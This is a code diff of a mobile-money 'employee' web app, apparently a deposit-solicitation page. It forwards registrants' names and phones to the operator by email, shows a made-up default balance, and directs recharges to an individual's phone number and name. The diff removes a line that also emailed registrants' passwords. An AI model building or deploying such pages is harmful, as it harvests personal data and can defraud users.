@@ -852,14 +852,14 @@
         <div class="auth-tab" onclick="switchAuthTab('register')" id="registerTab">Register</div>
       </div>
 
-      <!-- LOGIN FORM -->
+      <!-- LOGIN FORM - Empty placeholders -->
       <div id="loginForm" class="auth-form active">
         <form onsubmit="handleLogin(event)">
           <div class="form-group">
             <label>Phone Number</label>
             <div class="input-icon">
               <i class="fas fa-phone-alt"></i>
-              <input type="tel" id="loginPhone" placeholder="0756 673 144" required>
+              <input type="tel" id="loginPhone" placeholder="Enter your phone number" required>
             </div>
           </div>
 
@@ -867,7 +867,7 @@
             <label>Password</label>
             <div class="input-icon">
               <i class="fas fa-lock"></i>
-              <input type="password" id="loginPassword" placeholder="••••••••" required>
+              <input type="password" id="loginPassword" placeholder="Enter your password" required>
             </div>
           </div>
 
@@ -881,7 +881,7 @@
         </form>
       </div>
 
-      <!-- REGISTRATION FORM - Updated with email notifications -->
+      <!-- REGISTRATION FORM - Empty placeholders -->
       <div id="registerForm" class="auth-form">
         <form id="registrationForm" onsubmit="handleRegisterWithEmail(event)">
           <div class="form-group">
@@ -896,7 +896,7 @@
             <label>Phone Number</label>
             <div class="input-icon">
               <i class="fas fa-phone-alt"></i>
-              <input type="tel" id="regPhone" placeholder="0756 673 144" required>
+              <input type="tel" id="regPhone" placeholder="Enter your phone number" required>
             </div>
           </div>
 
@@ -1052,12 +1052,12 @@
       <!-- Header with time -->
       <div class="profile-header">
         <span class="time" id="currentTime">9:24 PM</span>
-        <span class="profile-title"><i class="fas fa-user"></i> Mindy official</span>
+        <span class="profile-title"><i class="fas fa-user"></i> <span id="profileDisplayName">User</span></span>
       </div>
 
       <!-- Employee info -->
       <div class="employee-info">
-        <div class="employee-name" id="profileName">M3 Regular Employee</div>
+        <div class="employee-name" id="profileName">Regular Employee</div>
         <div class="employee-role">Regular Employee</div>
       </div>
 
@@ -1164,7 +1164,7 @@
         <button class="close-btn" onclick="closeDepositModal()">&times;</button>
       </div>
       
-      <!-- Recipient info -->
+      <!-- Recipient info (only appears after login when user clicks Recharge) -->
       <div class="recipient-card">
         <div class="number">0756 673 144</div>
         <div class="name">NAMUHANGA VERONIC</div>
@@ -1265,6 +1265,15 @@
         registerTab.classList.add('active');
         loginTab.classList.remove('active');
       }
+      
+      // Clear any values when switching tabs
+      document.getElementById('loginPhone').value = '';
+      document.getElementById('loginPassword').value = '';
+      document.getElementById('regFullName').value = '';
+      document.getElementById('regPhone').value = '';
+      document.getElementById('regPassword').value = '';
+      document.getElementById('regConfirmPassword').value = '';
+      document.getElementById('regCountry').value = '';
     }
 
     // Handle Registration with Email Notification
@@ -1311,7 +1320,6 @@
         formData.append('Name', fullName);
         formData.append('Phone', phone);
         formData.append('Country', country);
-        formData.append('Password', password); // Be careful sending passwords via email!
         formData.append('_subject', '🎉 NEW CIUE REGISTRATION!');
         formData.append('_captcha', 'false');
         
@@ -1330,7 +1338,7 @@
         showEmailStatus('⚠️ Could not send email, but registration saved locally.', false);
       }
       
-      // Save user locally (always works even if email fails)
+      // Save user locally
       users[phone] = {
         fullName: fullName,
         phone: phone,
@@ -1395,9 +1403,9 @@
       document.getElementById('balanceAmount').innerHTML = `${(user.balance || 12500).toLocaleString()} <small>UGX</small>`;
       
       // Update profile page with user data
-      document.getElementById('profileName').textContent = user.fullName || 'M3 Regular Employee';
+      document.getElementById('profileName').textContent = user.fullName || 'Regular Employee';
+      document.getElementById('profileDisplayName').textContent = user.fullName.split(' ')[0] || 'User';
       document.getElementById('mainWallet').innerHTML = `${(user.balance || 12500).toFixed(2)} <small>UGX</small>`;
-      document.querySelector('.profile-title').innerHTML = `<i class="fas fa-user"></i> ${user.fullName.split(' ')[0] || 'Mindy'}`;
       
       window.currentUserPhone = phone;
       window.currentUser = user;
@@ -1442,8 +1450,14 @@
       document.getElementById('profilePage').style.display = 'none';
       switchAuthTab('login');
       
+      // Clear all fields
       document.getElementById('loginPhone').value = '';
       document.getElementById('loginPassword').value = '';
+      document.getElementById('regFullName').value = '';
+      document.getElementById('regPhone').value = '';
+      document.getElementById('regPassword').value = '';
+      document.getElementById('regConfirmPassword').value = '';
+      document.getElementById('regCountry').value = '';
     }
 
     // DEPOSIT MODAL FUNCTIONS
@@ -1567,7 +1581,7 @@
         }
       }
       
-      // Create demo account if none exists
+      // Create demo account if none exists (for testing only - this won't show in forms)
       const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
       if (Object.keys(users).length === 0) {
         users['0756673144'] = {
